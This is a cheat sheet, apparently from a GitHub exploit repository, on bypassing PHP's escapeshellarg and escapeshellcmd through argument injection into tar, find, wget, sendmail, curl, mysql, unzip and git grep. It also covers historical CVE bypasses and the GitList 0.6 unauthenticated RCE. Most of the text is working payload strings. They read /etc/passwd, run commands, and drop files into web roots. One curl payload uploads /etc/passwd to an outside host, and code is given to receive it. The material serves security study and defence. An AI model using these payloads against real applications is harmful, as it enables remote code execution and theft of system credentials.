# Introduction

source https://github.com/kacperszurek/exploits/blob/master/GitList/

**TL;DR: How exploit/bypass/use PHP escapeshellarg/escapeshellcmd functions.**

I create this simple cheat sheet because of [GitList 0.6 Unauthenticated RCE](https://github.com/kacperszurek/exploits/blob/master/GitList/gitlist_unauthenticated_rce.py) so you can easily understand how it works.

_Note: This is simple list with easy to understand examples so it doesn't contain all/comprehensive details about escapeshell* functions._

This document is also available on [GitHub](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md).

# Table of contents
- [Introduction](#introduction)
- [Table of contents](#table-of-contents)
- [What escapeshellarg and escapeshellcmd really do?](#what-escapeshellarg-and-escapeshellcmd-really-do)
- [Known bypasses/exploits](#known-bypassesexploits)
- [Argument Injection](#argument-injection)
  - [TAR](#tar)
  - [FIND](#find)
  - [Escapeshellcmd with escapeshellarg](#escapeshellcmd-with-escapeshellarg)
  - [WGET](#wget)
  - [Command executed using .bat](#command-executed-using-bat)
  - [SENDMAIL](#sendmail)
  - [CURL](#curl)
  - [MYSQL](#mysql)
  - [UNZIP](#unzip)
  - [Strip non-ascii characters if the LANG environment variable is not set](#strip-non-ascii-characters-if-the-lang-environment-variable-is-not-set)
- [Historical exploits](#historical-exploits)
- [GitList RCE Exploit](#gitlist-rce-exploit)

# What escapeshellarg and escapeshellcmd really do?

| Function  | Description | 
|:-------------:|:-------------:
| [escapeshellcmd](http://www.php.net/manual/en/function.escapeshellcmd.php) | ensure that user execute only *one command*<br />user can specify unlimited number of parameters<br />user cannot execute different command |
| [escapeshellarg](http://php.net/manual/en/function.escapeshellarg.php) | ensure that user pass only *one parameter* to command<br />user cannot specify more that one parameter<br />user cannot execute different command |

Example. Let't use [groups](http://man7.org/linux/man-pages/man1/groups.1.html) which prints group memberships for each username.

```php
$username = 'myuser';
system('groups '.$username);
=>
myuser : myuser adm cdrom sudo dip plugdev lpadmin sambashare
```

But attacker can use `;` or `||` inside `$username`.

On Linux this means that second command will be executed after first one:

```php
$username = 'myuser;id';
system('groups '.$username);
=>
myuser : myuser adm cdrom sudo dip plugdev lpadmin sambashare
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

In order to protect against this we are using `escapeshellcmd`.

Now attacker cannot run second command.

```php
$username = 'myuser;id';
// escapeshellcmd adds \ before ;
system(escapeshellcmd('groups '.$username));
=>
(nothing)
```

Why? Because internally PHP runs this command:

```bash
$ groups myuser\;id
groups: „myuser;id”: no such user
```

`myuser\;id` is treated as single string.

But in this approach attacker can specify more parameters to `groups`.

For example he can check multiple users at once:

```php
$username = 'myuser1 myuser2';
system('groups '.$username);
=>
myuser1 : myuser1 adm cdrom sudo
myuser2 : myuser2 adm cdrom sudo
```

Let's assume that we want to allow checking only one user per script execution:

```PHP
$username = 'myuser1 myuser2';
system('groups '.escapeshellarg($username));
=>
(noting)
```

Why? Because now `$username` is treated as single parameter:

```
$ groups 'myuser1 myuser2'
groups: "myuser1 myuser2": no such user
```

# Known bypasses/exploits

When you want to exploit those functions you have 2 options:

* if PHP version is VERY OLD you can try one of the [historical exploits](#historical-exploits),
* otherwise you need to try [Argument Injection](#argument-injection) technique.

# Argument Injection

As you can see from previous chapter it's not possible to execute second command when escapeshellcmd/escapeshellarg is used.

But still we can pass arguments to the first command.

This means that we can also pass new option to the command.

Ability to exploit vulnerability depends on the target executable.

Below you can find list of known executables with some specific options which can be misused.

## [TAR](http://baesystemsai.blogspot.fr/2013/11/security-issues-with-using-phps.html)

Compress `some_file` into `/tmp/sth`.

```php
$command = '-cf /tmp/sth /some_file';
system(escapeshellcmd('tar '.$command));
```

Create empty `/tmp/exploit` file.

```php
$command = "--use-compress-program='touch /tmp/exploit' -cf /tmp/passwd /etc/passwd";
system(escapeshellcmd('tar '.$command));
```

## [FIND](https://www.securify.nl/blog/SFY20170103/spot-the-bug-challenge-2016-write-up.html)

Find `some_file` inside `/tmp` directory.

```php
$file = "some_file";
system("find /tmp -iname ".escapeshellcmd($file));
```

Print `/etc/passwd` content.

```php
$file = "sth -or -exec cat /etc/passwd ; -quit";
system("find /tmp -iname ".escapeshellcmd($file));
```

## [Escapeshellcmd with escapeshellarg](https://blog.ripstech.com/2017/why-mail-is-dangerous-in-php/)

In this configuration we can pass second argument to the function.

List files inside `/tmp` dir and ignore `sth`.

```php
$arg = "sth";
system(escapeshellcmd("ls --ignore=".escapeshellarg($arg).' /tmp'));
```

List files inside `/tmp` dir and ignore `sth`. Use a long listing format.

```php
$arg = "sth' -l ";
// ls --ignore='exploit'\\'' -l \' /tmp
system(escapeshellcmd("ls --ignore=".escapeshellarg($arg).' /tmp'));
```


## WGET

Download `example.php`.

```php
$url = 'http://example.com/example.php';
system(escapeshellcmd('wget '.$url));
```

Save `.php` file to specific directory:

```php
$url = '--directory-prefix=/var/www/html http://example.com/example.php';
system(escapeshellcmd('wget '.$url));
```

## [Command executed using .bat](https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/)

Print list of files inside `somedir`.

```php
$dir = "somedir";
file_put_contents('out.bat', escapeshellcmd('dir '.$dir));
system('out.bat');
```

Also execute `whoami` command.

```php
$dir = "somedir \x1a whoami";
file_put_contents('out.bat', escapeshellcmd('dir '.$dir));
system('out.bat');
```

See: [how passing parameters to a new process on Windows](http://daviddeley.com/autohotkey/parameters/parameters.htm#WINPASS).

## [SENDMAIL](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

Send `mail.txt`. Set the envelope sender address to `from@sth.com`

```php
$from = 'from@sth.com';
system("/usr/sbin/sendmail -t -i -f".escapeshellcmd($from ).' < mail.txt');
```

Print `/etc/passwd` content.

```php
$from = 'from@sth.com -C/etc/passwd -X/tmp/output.txt';
system("/usr/sbin/sendmail -t -i -f".escapeshellcmd($from ).' < mail.txt');
```


## [CURL](https://tom0li.github.io/2018/03/06/escapeshellarg&escapeshellcmd/)

Download `http://example.com` content.

```php
$url = 'http://example.com';
system(escapeshellcmd('curl '.$url));
```

Send `/etc/passwd` content to `http://example.com`.

```php
$url = '-F password=@/etc/passwd http://example.com';
system(escapeshellcmd('curl '.$url));
```

You can get file using:

```php
file_put_contents('passwords.txt', file_get_contents($_FILES['password']['tmp_name']));
```

## [MYSQL](http://skysec.top/2017/12/14/pwnhub%E6%88%90%E5%8A%9F%E5%B0%B1%E6%98%AF%E8%A6%81%E6%A2%AD%E5%93%88%E4%B9%8B%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/)

Execute sql statement:

```php
$sql = 'SELECT sth FROM table';
system("mysql -uuser -ppassword -e ".escapeshellarg($sql));
```

Run `id` command.

```php
$sql = '\! id';
system("mysql -uuser -ppassword -e ".escapeshellarg($sql));
```

## [UNZIP](http://lab.onsec.ru/2013/03/breaking-escapeshellarg-news.html)

Unpack all `*.tmp` files from `archive.zip` into `/tmp` directory.

```
$zip_name = 'archive.zip';
system(escapeshellcmd('unzip -j '.$zip_name.' *.txt -d /aa/1'));
```

Unpack all `*.tmp` files from `archive.zip` into `/var/www/html` directory.

```
$zip_name = '-d /var/www/html archive.zip';
system('unzip -j '.escapeshellarg($zip_name).' *.tmp -d /tmp');
```

## [Strip non-ascii characters if the LANG environment variable is not set](https://bugs.php.net/bug.php?id=54391)

```
$filename = 'résumé.pdf';
// string(10) "'rsum.pdf'"
var_dump(escapeshellarg($filename));
setlocale(LC_CTYPE, 'en_US.utf8');
//string(14) "'résumé.pdf'" 
var_dump(escapeshellarg($filename));

```

# Historical exploits

1\. [PHP <= 4.3.6 on Windows](https://www.securitytracker.com/id/1010410) - CVE-2004-0542

```
$find = 'word';
system('FIND /C /I '.escapeshellarg($find).' c:\\where\\');
```

Run also `dir` command.

```
$find = 'word " c:\\where\\ || dir || ';
system('FIND /C /I '.escapeshellarg($find).' c:\\where\\');
```

2\. [PHP 4 <= 4.4.8 and PHP 5 <= 5.2.5](
https://www.sektioneins.de/en/advisories/advisory-032008-php-multibyte-shell-command-escaping-bypass-vulnerability.html) - CVE-2008-2051

Shell needs to uses a locale with a variable width character set like GBK, EUC-KR, SJIS.

```
$text = "sth";
system(escapeshellcmd("echo ".$text));
```

```
$text = "sth \xc0; id";
system(escapeshellcmd("echo ".$text));
```

OR

```
$text1 = 'word';
$text2 = 'word2';
system('echo '.escapeshellarg($text1).' '.escapeshellarg($text2));
```


```
$text1 = "word \xc0";
$text2 = "; id ; #";
system('echo '.escapeshellarg($text1).' '.escapeshellarg($text2));
```

3\. [PHP < 5.4.42, 5.5.x before 5.5.26, 5.6.x before 5.6.10 on Windows](https://bugs.php.net/bug.php?id=69646) - CVE-2015-4642

Pass additional third parameter `(--param3)` to function.

```
$a = 'param1_value';
$b = 'param2_value';
system('my_command --param1 ' . escapeshellarg($a) . ' --param2 ' . escapeshellarg($b));
```

```
$a = 'a\\';
$b = 'b -c --param3\\';
system('my_command --param1 ' . escapeshellarg($a) . ' --param2 ' . escapeshellarg($b));
```

4\. [PHP 7.x before 7.0.2](https://bugs.php.net/bug.php?id=71270) - CVE-2016-1904

Heap-based buffer overflow if you pass `1024mb` string to `escapeshellarg` or `escapeshellcmd`.

5\. [PHP 5.4.x < 5.4.43 / 5.5.x < 5.5.27 / 5.6.x < 5.6.11 on Windows](https://bugs.php.net/bug.php?id=69768)

Expand some environment variables when [EnableDelayedExpansion](https://ss64.com/nt/delayedexpansion.html) is enabled.

Then `!STH!` works similar to `%STH%`.

`escapeshellarg` doesn't sanitize `!` character.

EnableDelayedExpansion can be set in the registry under HKLM or HKCU:

```
[HKEY_CURRENT_USER\Software\Microsoft\Command Processor]
"DelayedExpansion"= (REG_DWORD)
1=enabled 0=disabled (default)
```

Example:

```php
// Leak appdata dir value
$text = '!APPDATA!';
print "echo ".escapeshellarg($text);
```

6\. [PHP < 5.6.18](https://bugs.php.net/bug.php?id=71039)

The functions defined in `ext/standard/exec.c` which work with strings (`escapeshellcmd`, `eschapeshellarg`, `shell_exec`), all ignore the length of the PHP string, and work with NULL termination instead.

```php
echo escapeshellarg("hello\0world");
=>
hello
```


# GitList RCE Exploit

File: [src/Git/Repository.php](https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322)

```
public function searchTree($query, $branch)
{
    if (empty($query)) {
        return null;
    }

    $query = escapeshellarg($query);

    try {
        $results = $this->getClient()->run($this, "grep -i --line-number {$query} $branch");
    } catch (\RuntimeException $e) {
        return false;
    }
}
```

Simplified:

```
$query = 'sth';
system('git grep -i --line-number '.escapeshellarg($query).' *');
```

When we check [git grep documentation](https://git-scm.com/docs/git-grep):

```
--open-files-in-pager[=<pager>]
Open the matching files in the pager (not the output of grep). If the pager happens to be "less" or "vi", and the user specified only one pattern, the first file is positioned at the first match automatically.
```

So basically `--open-files-in-pager` works like `-exec` in `find.`

```
$query = '--open-files-in-pager=id;';
system('git grep -i --line-number '.escapeshellarg($query).' *');
```

When we put this to the console:

```
$ git grep -i --line-number '--open-files-in-pager=id;' *
uid=1000(user) gid=1000(user) grupy=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
id;: 1: id;: README.md: not found
```

